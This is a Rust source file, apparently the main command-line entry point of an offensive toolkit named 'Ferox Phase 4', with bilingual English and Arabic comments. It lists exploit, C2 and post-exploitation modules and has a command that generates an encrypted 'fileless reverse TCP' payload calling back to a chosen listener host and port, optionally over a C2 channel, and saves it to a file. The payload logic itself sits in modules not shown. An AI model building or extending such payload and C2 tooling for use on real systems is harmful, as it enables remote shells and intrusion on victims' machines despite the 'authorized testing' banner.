// Ferox Phase 4 - Main CLI Interface
// واجهة سطر الأوامر الرئيسية

use clap::{Parser, Subcommand};
use colored::Colorize;
use ferox_phase4::{BANNER, VERSION};
use ferox_phase4::core::payload_engine::TargetOS;
use ferox_phase4::modules::payloads::rev_tcp_fileless::{FilelessReverseTcp, ReverseTcpConfig};
use ferox_phase4::modules::{ModuleManager, ModuleType};

#[derive(Parser)]
#[command(name = "ferox")]
#[command(about = "Ferox Phase 4 - Smart Payload System with Cloud-Native C2", long_about = None)]
#[command(version = VERSION)]
struct Cli {
    #[command(subcommand)]
    command: Commands,
}

#[derive(Subcommand)]
enum Commands {
    /// List all available modules | عرض جميع الوحدات المتاحة
    List {
        /// Filter by module type
        #[arg(short, long)]
        type_filter: Option<String>,
    },

    /// Show module details | عرض تفاصيل الوحدة
    Info {
        /// Module name
        module: String,
    },

    /// Generate payload | توليد حمولة
    Payload {
        /// Target host/IP
        #[arg(short = 'H', long)]
        lhost: String,

        /// Target port
        #[arg(short = 'P', long, default_value = "4444")]
        lport: u16,

        /// Target OS (windows, linux, macos, universal)
        #[arg(short = 'O', long, default_value = "universal")]
        os: String,

        /// C2 channel URL (optional)
        #[arg(short, long)]
        c2: Option<String>,

        /// Output file
        #[arg(short, long)]
        output: Option<String>,
    },

    /// Module statistics | إحصائيات الوحدات
    Stats,
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    env_logger::init();

    // Display banner
    println!("{}", BANNER.bright_cyan());
    println!("{} {}\n", "Version:".bright_white(), VERSION.bright_yellow());

    let cli = Cli::parse();

    match cli.command {
        Commands::List { type_filter } => {
            let manager = ModuleManager::new();
            
            if let Some(filter) = type_filter {
                let module_type = match filter.to_lowercase().as_str() {
                    "payload" => ModuleType::Payload,
                    "c2" => ModuleType::C2,
                    "exploit" => ModuleType::Exploit,
                    "post" => ModuleType::PostExploitation,
                    "aux" => ModuleType::Auxiliary,
                    _ => {
                        eprintln!("{} Invalid module type", "❌".bright_red());
                        return Ok(());
                    }
                };

                let modules = manager.registry().find_by_type(module_type);
                println!("\n{} {:?} Modules:", "→".bright_blue(), module_type);
                for module in modules {
                    println!("  {} {}", "•".bright_white(), module.name.bright_yellow());
                }
            } else {
                manager.registry().list_all();
            }
        }

        Commands::Info { module } => {
            let manager = ModuleManager::new();
            manager.registry().show_details(&module);
        }

        Commands::Payload { lhost, lport, os, c2, output } => {
            println!("{} Generating payload...\n", "→".bright_blue());

            let target_os = match os.to_lowercase().as_str() {
                "windows" => TargetOS::Windows,
                "linux" => TargetOS::Linux,
                "macos" | "mac" => TargetOS::MacOS,
                "universal" | "all" => TargetOS::Universal,
                _ => {
                    eprintln!("{} Invalid OS type", "❌".bright_red());
                    return Ok(());
                }
            };

            let module = FilelessReverseTcp::new()?;
            let config = ReverseTcpConfig {
                lhost: lhost.clone(),
                lport,
                target_os,
                encrypt: true,
                c2_channel: c2,
            };

            let result = module.execute(config)?;
            result.display();

            if let Some(path) = output {
                println!("\n{} Saving to: {}", "→".bright_blue(), path);
                result.save_to_file(&path)?;
                println!("{} Saved successfully!", "✅".bright_green());
            }
        }

        Commands::Stats => {
            let manager = ModuleManager::new();
            manager.show_stats();
        }
    }

    println!("\n{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());
    println!("{}", "⚠️  For authorized testing only!".bright_red().bold());
    println!("{}", "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━".bright_cyan());

    Ok(())
}
